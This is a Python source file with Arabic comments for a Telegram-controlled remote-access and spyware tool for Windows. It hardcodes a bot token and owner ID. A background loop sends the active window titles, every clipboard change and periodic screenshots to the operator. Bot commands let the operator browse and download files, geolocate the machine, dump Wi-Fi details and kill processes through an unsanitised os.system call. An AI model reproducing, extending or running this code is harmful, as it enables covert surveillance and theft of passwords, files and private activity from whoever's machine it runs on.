import telebot
from telebot import types
import pyautogui
import pyperclip
import os
import time
import requests
import subprocess
import win32gui
import threading
from datetime import datetime

# --- 1. إعدادات البوت ---
TOKEN = "7441270348:AAE7SFRVxepMoBIw2IGXsbtVM0cf5ryBXAA"
MY_ID = 1431886140

bot = telebot.TeleBot(TOKEN)

# إعدادات النظام
SCREENSHOT_INTERVAL = 60
current_path = os.getcwd()
clipboard_history = []
LOG_FILE = f"Log_{datetime.now().strftime('%Y-%m-%d')}.txt"

# قاموس لتخزين أسماء الملفات مؤقتاً (لحل مشكلة طول الاسم)
file_map = {}

# --- 2. دوال مساعدة ---
def is_authorized(user_id):
    return user_id == MY_ID

def log_event(text):
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f: f.write(f"[{timestamp}] {text}\n")
    except: pass

def create_main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        types.KeyboardButton('📸 لقطة شاشة'), types.KeyboardButton('📂 مدير الملفات'),
        types.KeyboardButton('📍 الموقع'), types.KeyboardButton('📶 الشبكة'),
        types.KeyboardButton('📋 سجل الحافظة'), types.KeyboardButton('☠️ قتل برنامج'),
        types.KeyboardButton('ℹ️ معلومات النظام'), types.KeyboardButton('📜 تحميل السجل')
    )
    return markup

# --- 3. المراقبة التلقائية ---
def automatic_monitor():
    last_window = ""
    last_clipboard = ""
    last_screenshot_time = time.time()
    
    try:
        bot.send_message(MY_ID, "🚀 **تم تشغيل النظام (تم إصلاح مشكلة الملفات)**", reply_markup=create_main_keyboard())
    except: pass

    while True:
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # مراقبة النوافذ
            try:
                window = win32gui.GetForegroundWindow()
                curr_window = win32gui.GetWindowText(window)
            except: curr_window = ""

            if curr_window and curr_window != last_window:
                bot.send_message(MY_ID, f"👀 **[نشاط]** {curr_window}")
                log_event(f"نافذة: {curr_window}")
                last_window = curr_window

            # مراقبة الحافظة
            try:
                curr_clip = pyperclip.paste()
                if curr_clip and curr_clip != last_clipboard:
                    bot.send_message(MY_ID, f"📋 **[نسخ]**\n{curr_clip}")
                    clipboard_history.append(f"[{timestamp}] {curr_clip}")
                    log_event(f"نسخ: {curr_clip}")
                    last_clipboard = curr_clip
            except: pass

            # صورة تلقائية
            if time.time() - last_screenshot_time > SCREENSHOT_INTERVAL:
                try:
                    shot = "auto.png"
                    pyautogui.screenshot(shot)
                    with open(shot, 'rb') as f: bot.send_photo(MY_ID, f, caption=f"🔄 {timestamp}")
                    os.remove(shot)
                except: pass
                last_screenshot_time = time.time()

            time.sleep(1.5)
        except: time.sleep(5)

# --- 4. مدير الملفات التفاعلي (مصحح) ---

def get_file_keyboard(path):
    """إنشاء أزرار للملفات باستخدام معرفات قصيرة لتجنب الأخطاء"""
    global file_map
    file_map = {} # تصفير الذاكرة المؤقتة
    
    markup = types.InlineKeyboardMarkup()
    try:
        items = os.listdir(path)
        folders = [f for f in items if os.path.isdir(os.path.join(path, f))]
        files = [f for f in items if os.path.isfile(os.path.join(path, f))]
        
        markup.add(types.InlineKeyboardButton("⬆️ ...رجوع للخلف", callback_data="CD_UP"))
        
        # إضافة المجلدات (نستخدم index بدلاً من الاسم الكامل في البيانات)
        for i, folder in enumerate(folders[:15]): # نعرض أول 15 فقط
            file_key = f"DIR_{i}"
            file_map[file_key] = folder # نربط الكود القصير بالاسم الحقيقي
            markup.add(types.InlineKeyboardButton(f"📁 {folder}", callback_data=file_key))
            
        # إضافة الملفات
        for i, file in enumerate(files[:15]):
            file_key = f"FILE_{i}"
            file_map[file_key] = file
            markup.add(types.InlineKeyboardButton(f"📄 {file}", callback_data=file_key))
            
    except Exception as e:
        markup.add(types.InlineKeyboardButton(f"خطأ: {str(e)[:15]}", callback_data="NONE"))
        
    return markup

@bot.message_handler(func=lambda m: m.text == '📂 مدير الملفات')
def open_file_manager(message):
    if not is_authorized(message.chat.id): return
    global current_path
    bot.send_message(
        message.chat.id, 
        f"📂 **المسار الحالي:**\n`{current_path}`", 
        parse_mode="Markdown",
        reply_markup=get_file_keyboard(current_path)
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if not is_authorized(call.message.chat.id): return
    global current_path, file_map
    
    data = call.data
    
    try:
        if data == "CD_UP":
            current_path = os.path.dirname(current_path)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"📂 **المسار الحالي:**\n`{current_path}`",
                parse_mode="Markdown",
                reply_markup=get_file_keyboard(current_path)
            )

        elif data in file_map:
            real_name = file_map[data] # جلب الاسم الحقيقي من الذاكرة
            
            if data.startswith("DIR_"):
                # دخول مجلد
                new_path = os.path.join(current_path, real_name)
                if os.path.exists(new_path):
                    current_path = new_path
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f"📂 **المسار الحالي:**\n`{current_path}`",
                        parse_mode="Markdown",
                        reply_markup=get_file_keyboard(current_path)
                    )
            
            elif data.startswith("FILE_"):
                # تحميل ملف
                file_path = os.path.join(current_path, real_name)
                bot.answer_callback_query(call.id, "جاري الرفع...")
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        bot.send_document(call.message.chat.id, f)
                else:
                    bot.answer_callback_query(call.id, "الملف غير موجود")

    except Exception as e:
        bot.answer_callback_query(call.id, f"خطأ: {e}")

# --- 5. باقي الأوامر ---

@bot.message_handler(func=lambda m: m.text == '📸 لقطة شاشة')
def screen(m):
    if not is_authorized(m.chat.id): return
    try:
        pyautogui.screenshot("s.png")
        with open("s.png", 'rb') as f: bot.send_photo(m.chat.id, f)
        os.remove("s.png")
    except: pass

@bot.message_handler(func=lambda m: m.text == '📍 الموقع')
def loc(m):
    if not is_authorized(m.chat.id): return
    try:
        r = requests.get("http://ip-api.com/json/").json()
        bot.reply_to(m, f"📍 {r['city']}, {r['country']}\nIP: {r['query']}")
    except: pass

@bot.message_handler(func=lambda m: m.text == '📶 الشبكة')
def wifi(m):
    if not is_authorized(m.chat.id): return
    try:
        r = subprocess.check_output(["netsh", "wlan", "show", "interfaces"]).decode("utf-8", errors="ignore")
        bot.reply_to(m, r[:3000])
    except: pass

@bot.message_handler(func=lambda m: m.text == '☠️ قتل برنامج')
def kill_ask(m):
    if not is_authorized(m.chat.id): return
    msg = bot.reply_to(m, "اكتب اسم البرنامج (مثال: chrome.exe):")
    bot.register_next_step_handler(msg, lambda msg: os.system(f"taskkill /f /im {msg.text}") and bot.reply_to(msg, "تم التنفيذ"))

@bot.message_handler(func=lambda m: m.text == '📋 سجل الحافظة')
def history(m):
    if not is_authorized(m.chat.id): return
    bot.reply_to(m, "\n".join(clipboard_history[-10:]) if clipboard_history else "فارغ") # آخر 10 فقط

@bot.message_handler(func=lambda m: m.text == '📜 تحميل السجل')
def log_dl(m):
    if not is_authorized(m.chat.id): return
    try:
        with open(LOG_FILE, 'rb') as f: bot.send_document(m.chat.id, f)
    except: bot.reply_to(m, "لا يوجد سجل.")

@bot.message_handler(func=lambda m: m.text == 'ℹ️ معلومات النظام')
def sys_info(m):
    if not is_authorized(m.chat.id): return
    bot.reply_to(m, f"👤 {os.getlogin()}\n💻 {os.getcwd()}")

# --- التشغيل ---
if __name__ == "__main__":
    t = threading.Thread(target=automatic_monitor)
    t.daemon = True
    t.start()
    print("✅ النظام يعمل (الإصدار المصحح)...")
    while True:
        try:
            bot.infinity_polling(timeout=10, long_polling_timeout=5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)